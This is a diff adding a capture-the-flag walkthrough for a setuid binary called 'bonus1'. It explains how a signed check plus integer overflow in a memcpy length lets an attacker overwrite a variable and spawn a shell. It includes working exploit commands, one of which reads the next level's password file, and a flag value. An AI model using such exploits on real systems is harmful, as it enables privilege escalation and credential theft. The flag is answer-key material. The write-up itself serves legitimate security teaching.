@@ -1,0 +1,73 @@
+# bonus1 Walkthrough
+
+## Vulnerability: Integer Overflow in memcpy size argument
+
+### Binary Analysis
+
+```
+int main(int argc, char **argv)
+{
+    int  n;        // at esp+0x3c
+    char buf[40];  // at esp+0x14
+
+    n = atoi(argv[1]);
+    if (n > 9) return 1;         // signed comparison — negatives pass!
+
+    memcpy(buf, argv[2], n * 4); // n*4 cast to size_t (unsigned)
+
+    if (n == 0x574f4c46)         // "FLOW" in ASCII
+        execl("/bin/sh", "/bin/sh", NULL);
+
+    return 0;
+}
+```
+
+### Stack Layout
+
+```
+esp+0x14  buf[0]   ← memcpy destination
+  ...
+esp+0x3c  n        ← 40 bytes (0x28) above buf
+```
+
+### Exploit Logic
+
+**Step 1 — Bypass the guard with a negative number**
+
+`n > 9` uses a **signed** comparison. Any negative number passes.
+
+**Step 2 — Integer overflow on `n * 4`**
+
+`memcpy` takes `size_t` (unsigned). When `n` is negative, `n * 4` wraps around:
+
+```
+n = -2147483637
+n * 4 (32-bit signed) = -8589934548
+As uint32_t             = 44  (exactly enough to reach n)
+```
+
+The magic value: `-2147483637 = -(2^31 - 11)`, so `(-2147483637 * 4) mod 2^32 = 44`.
+
+**Step 3 — Overwrite `n` via memcpy**
+
+memcpy copies 44 bytes from `argv[2]` into `buf`:
+- Bytes 0–39: fill `buf` (padding)
+- Bytes 40–43: overwrite `n` with `0x574f4c46`
+
+Once `n == 0x574f4c46`, `execl("/bin/sh", ...)` runs with setuid bonus2 privileges.
+
+### Exploit Command
+
+```bash
+/home/user/bonus1/bonus1 -2147483637 $(python -c "print 'A'*40 + '\x46\x4c\x4f\x57'")
+```
+
+Then read the password:
+
+```bash
+echo 'cat /home/user/bonus2/.pass' | /home/user/bonus1/bonus1 -2147483637 $(python -c "print 'A'*40 + '\x46\x4c\x4f\x57'")
+```
+
+### Flag
+
+`579bd19263eb8655e4cf7b742d75edf8c38226925d78db8163506f5191825245`
